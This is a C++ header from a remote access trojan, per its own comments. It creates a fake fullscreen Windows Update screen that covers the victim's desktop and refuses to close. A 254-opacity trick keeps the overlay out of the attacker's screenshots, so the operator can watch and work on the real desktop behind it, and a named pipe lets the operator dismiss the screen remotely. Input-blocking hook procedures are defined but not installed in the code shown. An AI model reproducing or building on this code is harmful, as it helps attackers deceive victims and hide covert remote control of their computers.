// fake_update.h - Fake "Windows is updating" fullscreen overlay
// Built directly into the RAT - no separate DLL needed
#ifndef FAKE_UPDATE_H
#define FAKE_UPDATE_H

#include <windows.h>
#include <winerror.h>
#include <string>
#include <atomic>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")

// Named pipe for remote close signal
#define FAKE_UPDATE_PIPE "\\\\.\\pipe\\FakeUpdatePipe"

static std::atomic<bool> g_updateRunning(false);
static std::atomic<bool> g_updateClosing(false);
static HWND g_updateHwnd = NULL;
static HHOOK g_updateKeyboardHook = NULL;
static HHOOK g_updateMouseHook = NULL;

// Low-level keyboard hook - blocks ALL keys including Alt+F4, Ctrl+Alt+Del, etc.
static LRESULT CALLBACK UpdateKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) return 1;
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Low-level mouse hook - blocks ALL mouse input
static LRESULT CALLBACK UpdateMouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) return 1;
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Window procedure for the fake update window
static LRESULT CALLBACK UpdateWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);
            
            RECT rect;
            GetClientRect(hwnd, &rect);
            int w = rect.right - rect.left;
            int h = rect.bottom - rect.top;
            
            // Draw blue background
            HBRUSH bgBrush = CreateSolidBrush(RGB(0, 120, 215));
            FillRect(hdc, &rect, bgBrush);
            DeleteObject(bgBrush);
            
            SetBkMode(hdc, TRANSPARENT);
            
            HFONT hFontBig = CreateFontA(48, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
                DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "Segoe UI");
            HFONT hFontSmall = CreateFontA(24, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "Segoe UI");
            HFONT hFontPercent = CreateFontA(36, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "Segoe UI");
            
            // Title
            SelectObject(hdc, hFontBig);
            SetTextColor(hdc, RGB(255, 255, 255));
            const char* title = "Working on updates";
            RECT titleRect = {0, h/3, w, h/3 + 60};
            DrawTextA(hdc, title, -1, &titleRect, DT_CENTER | DT_TOP);
            
            // Subtitle
            SelectObject(hdc, hFontSmall);
            const char* subtitle = "Don't turn off your computer";
            RECT subRect = {0, h/3 + 60, w, h/3 + 100};
            DrawTextA(hdc, subtitle, -1, &subRect, DT_CENTER | DT_TOP);
            
            // Spinning dots animation
            static int dotPhase = 0;
            dotPhase = (dotPhase + 1) % 20;
            std::string dots;
            for (int i = 0; i < 5; i++) {
                dots += (i == dotPhase / 4) ? "o" : ".";
            }
            RECT dotsRect = {0, h/3 + 110, w, h/3 + 150};
            DrawTextA(hdc, dots.c_str(), -1, &dotsRect, DT_CENTER | DT_TOP);
            
            // Percentage counter
            static int percent = 0;
            if (!g_updateClosing) {
                percent = (percent + 1) % 101;
            }
            SelectObject(hdc, hFontPercent);
            char percentStr[16];
            sprintf(percentStr, "%d%% complete", percent);
            RECT pctRect = {0, h/3 + 160, w, h/3 + 210};
            DrawTextA(hdc, percentStr, -1, &pctRect, DT_CENTER | DT_TOP);
            
            // Footer
            SelectObject(hdc, hFontSmall);
            SetTextColor(hdc, RGB(200, 200, 200));
            const char* footer = "Your computer will restart automatically.";
            RECT footerRect = {0, h - 80, w, h - 40};
            DrawTextA(hdc, footer, -1, &footerRect, DT_CENTER | DT_TOP);
            
            DeleteObject(hFontBig);
            DeleteObject(hFontSmall);
            DeleteObject(hFontPercent);
            
            EndPaint(hwnd, &ps);
            
            if (!g_updateClosing) {
                InvalidateRect(hwnd, NULL, TRUE);
            }
            return 0;
        }
        
        case WM_CLOSE:
            return 0;
            
        case WM_DESTROY:
            PostQuitMessage(0);
            return 0;
    }
    return DefWindowProcA(hwnd, msg, wParam, lParam);
}

// Thread that listens on named pipe for close signal
static DWORD WINAPI UpdatePipeListener(LPVOID lpParam) {
    (void)lpParam;
    while (g_updateRunning && !g_updateClosing) {
        HANDLE hPipe = CreateNamedPipeA(
            FAKE_UPDATE_PIPE,
            PIPE_ACCESS_INBOUND,
            PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
            1, 0, 0, 1000, NULL
        );
        
        if (hPipe == INVALID_HANDLE_VALUE) {
            Sleep(500);
            continue;
        }
        
        BOOL connected = ConnectNamedPipe(hPipe, NULL) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);
        
        if (connected) {
            char buffer[32] = {0};
            DWORD bytesRead = 0;
            if (ReadFile(hPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL)) {
                buffer[bytesRead] = '\0';
                if (strcmp(buffer, "CLOSE") == 0) {
                    g_updateClosing = true;
                    if (g_updateHwnd) {
                        PostMessage(g_updateHwnd, WM_DESTROY, 0, 0);
                    }
                }
            }
            CloseHandle(hPipe);
        } else {
            CloseHandle(hPipe);
        }
    }
    return 0;
}

// Show the fake Windows Update screen (called directly from RAT)
static void ShowFakeUpdate() {
    if (g_updateRunning) return;
    g_updateRunning = true;
    g_updateClosing = false;
    
    HINSTANCE hInstance = GetModuleHandleA(NULL);
    WNDCLASSEXA wc = {0};
    wc.cbSize = sizeof(WNDCLASSEXA);
    wc.style = CS_HREDRAW | CS_VREDRAW;
    wc.lpfnWndProc = UpdateWndProc;
    wc.hInstance = hInstance;
    wc.hCursor = LoadCursor(NULL, IDC_WAIT);
    wc.hbrBackground = (HBRUSH)CreateSolidBrush(RGB(0, 120, 215));
    wc.lpszClassName = "FakeUpdateWindowClass";
    
    if (!RegisterClassExA(&wc)) {
        g_updateRunning = false;
        return;
    }
    
    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);
    
    g_updateHwnd = CreateWindowExA(
        WS_EX_TOPMOST | WS_EX_TOOLWINDOW | WS_EX_NOACTIVATE | WS_EX_LAYERED,
        "FakeUpdateWindowClass",
        "Windows Update",
        WS_POPUP | WS_VISIBLE,
        0, 0, screenW, screenH,
        NULL, NULL, hInstance, NULL
    );
    
    if (!g_updateHwnd) {
        UnregisterClassA("FakeUpdateWindowClass", hInstance);
        g_updateRunning = false;
        return;
    }
    
    // THE 254 OPACITY TRICK: 
    // DWM aggressively treats 255 opacity as non-layered to save memory.
    // By setting Alpha to 254 (99.6% solid, imperceptible to humans), DWM enforces
    // true layered composition. Since CAPTUREBLT is removed from screen_capture.cpp,
    // GDI completely ignores this window during screenshots, revealing the desktop beneath!
    SetLayeredWindowAttributes(g_updateHwnd, 0, 254, 0x00000002); // LWA_ALPHA

    // Start pipe listener thread for remote close signal
    CreateThread(NULL, 0, UpdatePipeListener, NULL, 0, NULL);
    
    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) && !g_updateClosing) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    // Cleanup
    if (g_updateKeyboardHook) {
        UnhookWindowsHookEx(g_updateKeyboardHook);
        g_updateKeyboardHook = NULL;
    }
    if (g_updateMouseHook) {
        UnhookWindowsHookEx(g_updateMouseHook);
        g_updateMouseHook = NULL;
    }
    if (g_updateHwnd) {
        DestroyWindow(g_updateHwnd);
        g_updateHwnd = NULL;
    }
    UnregisterClassA("FakeUpdateWindowClass", hInstance);
    g_updateRunning = false;
}

// Thread wrapper for ShowFakeUpdate
static DWORD WINAPI ShowFakeUpdateThread(LPVOID lpParam) {
    (void)lpParam;
    ShowFakeUpdate();
    return 0;
}

// Hide the fake update screen by sending CLOSE via named pipe
static bool HideFakeUpdate() {
    if (!g_updateRunning) return false;
    
    HANDLE hPipe = CreateFileA(
        FAKE_UPDATE_PIPE,
        GENERIC_WRITE,
        0, NULL, OPEN_EXISTING, 0, NULL
    );
    
    if (hPipe == INVALID_HANDLE_VALUE) {
        return false;
    }
    
    const char* closeMsg = "CLOSE";
    DWORD bytesWritten = 0;
    WriteFile(hPipe, closeMsg, strlen(closeMsg), &bytesWritten, NULL);
    CloseHandle(hPipe);
    return true;
}

#endif // FAKE_UPDATE_H
